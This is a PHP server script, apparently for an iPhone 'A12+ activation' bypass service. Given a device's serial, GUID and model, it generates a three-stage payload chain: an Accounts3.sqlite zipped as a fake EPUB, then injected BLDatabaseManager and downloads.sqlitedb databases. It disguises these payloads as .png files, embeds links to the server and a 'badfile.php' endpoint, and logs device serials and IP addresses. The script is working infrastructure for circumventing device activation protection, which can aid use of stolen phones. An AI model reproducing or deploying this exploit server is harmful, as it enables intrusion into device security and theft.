<?php
/**
 * RUST A12+ Activation Server - Accounts3.sqlite только из /Maker
 */

// === CONFIGURATION ===
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('max_execution_time', 120);
ini_set('memory_limit', '256M');
ini_set('log_errors', 1);
ini_set('error_log', is_writable(__DIR__) ? __DIR__ . '/php_errors.log' : '/tmp/php_errors.log');

// Security headers
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("Referrer-Policy: no-referrer");
if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') {
    header("Strict-Transport-Security: max-age=31536000; includeSubDomains");
}
header("Content-Type: application/json; charset=utf-8");

// === PATHS ===
define('BASE_PATH', __DIR__);
// On cloud platforms (Railway, Render etc.) the app dir is read-only — use /tmp for all writes
$_writable_root = is_writable(__DIR__) ? __DIR__ : '/tmp/hidden_server';
define('STORAGE_PATH',   $_writable_root . '/cache');
define('RATELIMIT_PATH', $_writable_root . '/ratelimit');
define('IP_COUNT_PATH',  $_writable_root . '/ip_limits');
define('SERIAL_LOG_PATH',$_writable_root . '/serial_logs');
define('DATA_PATH',      $_writable_root . '/data');
define('REGISTERED_SN_FILE', DATA_PATH . '/registered_sn.json');

// Ensure dirs exist
foreach ([STORAGE_PATH, RATELIMIT_PATH, IP_COUNT_PATH, SERIAL_LOG_PATH, DATA_PATH] as $dir) {
    if (!is_dir($dir)) mkdir($dir, 0755, true);
}

// === LOGGING ===
function log_debug($msg, $level = 'INFO') {
    $timestamp = date('Y-m-d H:i:s');
    error_log("[$timestamp] [$level] $msg");
}

// === SANITIZE ===
function sanitizeSerial($sn) {
    return preg_replace('/[^a-zA-Z0-9]/', '', strtoupper(trim($sn)));
}

// === CHECK REGISTRATION ===
function isSnRegistered($sn, $updateLastCheck = true) {
    $safeSn = sanitizeSerial($sn);
    if (empty($safeSn) || strlen($safeSn) < 8 || strlen($safeSn) > 20) return false;
    if (!file_exists(REGISTERED_SN_FILE)) return false;
    
    $data = json_decode(file_get_contents(REGISTERED_SN_FILE), true);
    if (!is_array($data)) return false;
    if (!isset($data[$safeSn]['active']) || $data[$safeSn]['active'] !== true) return false;
    if (isset($data[$safeSn]['suspended']) && $data[$safeSn]['suspended'] === true) return false;
    
    return true;
}

// === RATE LIMITING ===
function enforceRateLimit() {
    $ip = $_SERVER['REMOTE_ADDR'] ?: 'unknown';
    $cacheFile = RATELIMIT_PATH . '/' . md5($ip) . '.json';
    $now = time();
    $window = 60;
    
    $requests = [];
    if (file_exists($cacheFile)) {
        $data = json_decode(file_get_contents($cacheFile), true);
        if ($data && isset($data['requests'])) {
            $requests = array_filter($data['requests'], function($t) use ($now, $window) {
                return ($now - $t) < $window;
            });
        }
    }
    
    if (count($requests) >= 5) {
        log_debug("Rate limit exceeded for IP: $ip", "SECURITY");
        http_response_code(429);
        die(json_encode(['success' => false, 'error' => 'Too many requests. Try again later.']));
    }
    
    $requests[] = $now;
    file_put_contents($cacheFile, json_encode(['ip' => $ip, 'requests' => array_values($requests)]));
}

function checkIpFileLimit() {
    $ip = $_SERVER['REMOTE_ADDR'] ?: 'unknown';
    $countFile = IP_COUNT_PATH . '/' . md5($ip) . '.count';
    $hourStart = floor(time() / 3600) * 3600;
    
    $count = 0;
    if (file_exists($countFile)) {
        $parts = explode('|', trim(file_get_contents($countFile)));
        if (count($parts) == 2) {
            $lastReset = (int)$parts[0];
            $count = (int)$parts[1];
            if ($lastReset < $hourStart) $count = 0;
        }
    }
    
    if ($count >= 20) {
        http_response_code(429);
        die(json_encode(['success' => false, 'error' => 'Hourly file creation limit reached.']));
    }
    
    file_put_contents($countFile, "{$hourStart}|" . ($count + 1), LOCK_EX);
}

// === UTILS ===
function readSQLDump($filename) {
    if (!file_exists($filename)) {
        log_debug("File not found: $filename", "ERROR");
        http_response_code(500);
        die(json_encode(['success' => false, 'error' => "File $filename not found"]));
    }
    $content = file_get_contents($filename);
    if ($content === false) {
        log_debug("Cannot read file: $filename", "ERROR");
        http_response_code(500);
        die(json_encode(['success' => false, 'error' => "Cannot read $filename"]));
    }
    return $content;
}

function createSQLiteFromDump($sqlDump, $outputFile) {
    try {
        $sqlDump = preg_replace_callback(
            "/unistr\s*\(\s*['\"]([^'\"]*)['\"]\s*\)/i",
            function($matches) {
                $str = $matches[1];
                $str = preg_replace_callback('/\\\\u([0-9A-Fa-f]{4})/', function($m) {
                    return mb_convert_encoding(pack('H*', $m[1]), 'UTF-8', 'UCS-2BE');
                }, $str);
                return "'" . str_replace("'", "''", $str) . "'";
            },
            $sqlDump
        );
        $sqlDump = preg_replace("/unistr\s*\(\s*(['\"][^'\"]*['\"])\s*\)/i", "$1", $sqlDump);
        
        $db = new SQLite3($outputFile);
        $db->enableExceptions(true);
        
        $statements = explode(';', $sqlDump);
        foreach ($statements as $statement) {
            $statement = trim($statement);
            if (!empty($statement) && strlen($statement) > 5) {
                $db->exec($statement . ';');
            }
        }
        $db->close();
        
        if (!file_exists($outputFile) || filesize($outputFile) < 100) {
            throw new Exception("SQLite file too small");
        }
        return true;
    } catch (Exception $e) {
        log_debug("SQLite creation failed: " . $e->getMessage(), "ERROR");
        @unlink($outputFile);
        throw $e;
    }
}

function cleanupStorage() {
    $dirs = glob(STORAGE_PATH . '/*');
    if (!is_array($dirs) || count($dirs) < 4500) return;
    usort($dirs, function($a, $b) { return filemtime($a) - filemtime($b); });
    $toDelete = array_slice($dirs, 0, 500);
    foreach ($toDelete as $dir) {
        if (is_dir($dir)) {
            array_map('unlink', glob("$dir/*/*"));
            array_map('rmdir', glob("$dir/*"));
            rmdir($dir);
        }
    }
}

function logSerialDeviceData($sn, $ip, $prd, $iosVersion, $guid) {
    if (empty($sn)) return;
    $safeSn = sanitizeSerial($sn);
    $logFile = SERIAL_LOG_PATH . '/' . md5($safeSn) . '.log';
    $entry = "IP: $ip\nTime: " . date('Y-m-d H:i:s') . "\nPRD: $prd\niOS: $iosVersion\nGUID: $guid\n" . str_repeat('-', 40) . "\n";
    file_put_contents($logFile, $entry, FILE_APPEND | LOCK_EX);
}

// === MAIN ===
try {
    log_debug("=== START ===");
    log_debug("GET: " . json_encode($_GET));
    
    enforceRateLimit();
    
    $prd = $_GET['prd'] ?? '';
    $guid = $_GET['guid'] ?? '';
    $sn = $_GET['sn'] ?? '';
    $iosVersion = $_GET['ios_version'] ?? '';
    
    if (empty($prd) || empty($guid) || empty($sn)) {
        http_response_code(400);
        die(json_encode(['success' => false, 'error' => 'Missing prd, guid, or sn']));
    }
    
    $checkRegistration = false;
    if ($checkRegistration && !isSnRegistered($sn, true)) {
        usleep(random_int(100000, 300000));
        http_response_code(403);
        die(json_encode(['success' => false, 'error' => 'Device not registered. Contact support.']));
    }
    
    $prdFormatted = str_replace(',', '-', $prd);
    $prdFormatted = preg_replace('/[^a-zA-Z0-9\-_.]/', '', $prdFormatted);
    $iosVersionClean = !empty($iosVersion) ? preg_replace('/[^0-9.b]/', '', $iosVersion) : '';
    
    $ip = $_SERVER['REMOTE_ADDR'] ?: 'unknown';
    logSerialDeviceData($sn, $ip, $prdFormatted, $iosVersionClean, $guid);
    
    // === Accounts3.sqlite ТОЛЬКО ИЗ ПАПКИ /Maker ===
    // Путь строго: /Maker/Accounts3.sqlite
    $plistPath = BASE_PATH . "/Maker/Accounts3.sqlite";
    
    log_debug("Looking for Accounts3.sqlite at: $plistPath");
    
    if (!file_exists($plistPath) || !is_readable($plistPath)) {
        log_debug("Accounts3.sqlite not found at: $plistPath", "ERROR");
        http_response_code(500);
        die(json_encode(['success' => false, 'error' => 'Accounts3.sqlite not found in /Maker directory']));
    }
    
    $realPlistPath = realpath($plistPath);
    log_debug("Using plist: $realPlistPath");
    
    // === КЭШ ===
    $plistContentHash = md5_file($realPlistPath);
    $requestHash = hash('sha256', "{$prdFormatted}|{$guid}|{$sn}|{$iosVersionClean}|{$plistContentHash}");
    $cacheDir = STORAGE_PATH . '/' . $requestHash;
    $cacheFile = $cacheDir . '/response.json';
    
    if (file_exists($cacheFile) && (time() - filemtime($cacheFile)) < 3600) {
        log_debug("Serving from cache");
        readfile($cacheFile);
        exit;
    }
    
    if (!is_dir($cacheDir)) mkdir($cacheDir, 0755, true);
    checkIpFileLimit();
    cleanupStorage();
    
    // === STAGE 1: EPUB ===
    $stage1Dir = $cacheDir . '/firststp';
    if (!is_dir($stage1Dir)) mkdir($stage1Dir, 0755, true);
    
    $cachesDir = $stage1Dir . '/Accounts';
    if (!is_dir($cachesDir)) mkdir($cachesDir, 0755, true);
    file_put_contents($cachesDir . '/mimetype', 'application/epub+zip');
    
    $zip = new ZipArchive();
    $zipPath = $stage1Dir . '/temp.zip';
    if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        http_response_code(500);
        die(json_encode(['success' => false, 'error' => 'ZIP creation failed']));
    }
    $zip->addFile($cachesDir . '/mimetype', 'Accounts/mimetype');
    $zip->setCompressionName('Accounts/mimetype', ZipArchive::CM_STORE);
    $zip->addFile($realPlistPath, 'Accounts/Accounts3.sqlite');
    $zip->close();
    
    @unlink($cachesDir . '/mimetype');
    @rmdir($cachesDir);
    rename($zipPath, $stage1Dir . '/fixedfile');
    
    $isHttps = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');
    $protocol = $isHttps ? 'https' : 'http';
    $baseUrl = "$protocol://{$_SERVER['HTTP_HOST']}";
    $fixedFileUrl = "$baseUrl/cache/$requestHash/firststp/fixedfile";
    
    // === STAGE 2: BLDatabaseManager ===
    $stage2Dir = $cacheDir . '/2ndd';
    if (!is_dir($stage2Dir)) mkdir($stage2Dir, 0755, true);
    
    $blDump = readSQLDump(BASE_PATH . '/BLDatabaseManager3.png');
    $blDump = str_replace('KEYOOOOOO', $fixedFileUrl, $blDump);
    $blSqlite = $stage2Dir . '/BLDatabaseManager.sqlite';
    createSQLiteFromDump($blDump, $blSqlite);
    rename($blSqlite, $stage2Dir . '/belliloveu.png');
    $blUrl = "$baseUrl/cache/$requestHash/2ndd/belliloveu.png";
    
    // === STAGE 3: FINAL ===
    $stage3Dir = $cacheDir . '/last';
    if (!is_dir($stage3Dir)) mkdir($stage3Dir, 0755, true);
    
    $dlDump = readSQLDump(BASE_PATH . '/downloads.28.png');
    $dlDump = str_replace('http://google.com', $blUrl, $dlDump);
    $dlDump = str_replace('BADFILEURL', "$baseUrl/badfile.php", $dlDump);
    $dlDump = str_replace('GOODKEY', $guid, $dlDump);
    $finalDb = $stage3Dir . '/downloads.sqlitedb';
    createSQLiteFromDump($dlDump, $finalDb);
    rename($finalDb, $stage3Dir . '/apllefuckedhhh.png');
    $finalUrl = "$baseUrl/cache/$requestHash/last/apllefuckedhhh.png";
    
    // === RESPONSE ===
    $response = [
        'success' => true,
        'parameters' => compact('prd', 'guid', 'sn'),
        'links' => [
            'step1_fixedfile' => $fixedFileUrl,
            'step2_bldatabase' => $blUrl,
            'step3_final' => $finalUrl
        ]
    ];
    
    file_put_contents($cacheFile, json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
    echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    log_debug("SUCCESS: $requestHash");
    
} catch (Exception $e) {
    log_debug("FATAL: " . $e->getMessage(), "ERROR");
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => $e->getMessage()]);
}
?>